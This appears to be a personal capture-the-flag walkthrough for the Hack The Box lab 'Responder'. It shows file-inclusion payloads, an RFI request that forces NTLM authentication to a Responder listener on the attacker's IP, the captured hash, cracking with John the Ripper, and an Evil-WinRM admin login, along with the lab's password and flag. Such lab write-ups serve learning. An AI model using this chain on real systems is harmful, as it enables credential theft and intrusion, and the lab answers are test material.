Name: Responder
IP Address: 10.129.187.36
System: Windows

## Enumeration

### Nmap Scan:
[[Responder.xml]]
[[Responder.html]]
[[Responder_All.xml]]]
[[Responder_all.html]]
### Services

```
http-methods 

  Supported Methods: GET HEAD POST OPTIONS 

http-server-header 

Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1 

http-title 

Site doesn't have a title (text/html; charset=UTF-8).
```

Since port 80 is open, we can try and access the website:


It gives us the following error and a dns : `http://unika.htb/` which we can add to our `/etc/hosts`
![[Pasted image 20220611013838.png]]

We will also run a vulners scan to check for vulnerabilities
```sh
sudo nmap -T4 -sV -vvv -p 80 --script vulners $ip -oX Responder_http.xml
```
[[Responder_http.html]]

Read more on Vulnerability Scanning with nmap [Here](https://geekflare.com/nmap-vulnerability-scan/)

### Website Enum
![[Pasted image 20220611013859.png]]

![[Pasted image 20220611014103.png]]

## Exploitation

### Local File Inclusion
When switching languages, it uses `page` to load different languages, we can try LFI here:

`http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts`
![[Pasted image 20220611023308.png]]

### Remote File Inclusion

`http://unika.htb/index.php?page=//10.10.14.6/somefile`

### NTLM Responder

Start a responder listener on tun0
```sh
sudo responder -I tun0
```

Using RFI, replace the IP in  `page=//10.10.14.6/somefile` with your tun0 IP
http://unika.htb/index.php?page=//10.10.16.135/somefile

![[Pasted image 20220611024837.png]]

[[Responder Output]]

Hash: (Output this to file)
```sh
7f7177e05207675c:5440E2DFE0E8424C442217  
FD34517AE3:01010000000000000056F65A3D7DD8012E861D2638B2F92800000000020008005A005700520039000  
1001E00570049004E002D0042003600560030003200340051004F0047005A00300004003400570049004E002D004  
2003600560030003200340051004F0047005A0030002E005A005700520039002E004C004F00430041004C0003001  
4005A005700520039002E004C004F00430041004C00050014005A005700520039002E004C004F00430041004C000  
70008000056F65A3D7DD8010600040002000000080030003000000000000000010000000020000075D0C3D2439F1  
CD84607A6E5980B5652D7AA1F14B9969B82F2A568928D4EB5970A001000000000000000000000000000000000000  
900220063006900660073002F00310030002E00310030002E00310036002E003100330035000000000000000000
```
hash file: [[hash]]

### John the Ripper

```sh
┌──(kali㉿kali)-[/<..>/Responder]  
└─$ john           
Created directory: /home/kali/.john  
John the Ripper 1.9.0-jumbo-1+bleeding-aec1328d6c 2021-11-02 10:45:52 +0100 OMP [linux-gnu 6  
4-bit x86_64 AVX2 AC]  
Copyright (c) 1996-2021 by Solar Designer and others  
Homepage: https://www.openwall.com/john/  
  
Usage: john [OPTIONS] [PASSWORD-FILES]  
  
Use --help to list all available options.
```

```sh
john hash
```

This will take some time so be patient. Once it is cracked, you can view the password by doing:

```sh
john -show hash
```

Password: badminton

### Flag

Using the all scan flag for nmap [[Responder_all.html]] we found a port 5985 which we will use to interface with the windows service.

To connect to it, use Evil-WinRM and fill in the parameters
```sh
evil-winrm -i 10.129.187.36 -u Administrator -p badminton
```

![[Pasted image 20220611031034.png]]
![[Pasted image 20220611031120.png]]
Flag: `ea81b7afddd03efaa0945333ed147fac`
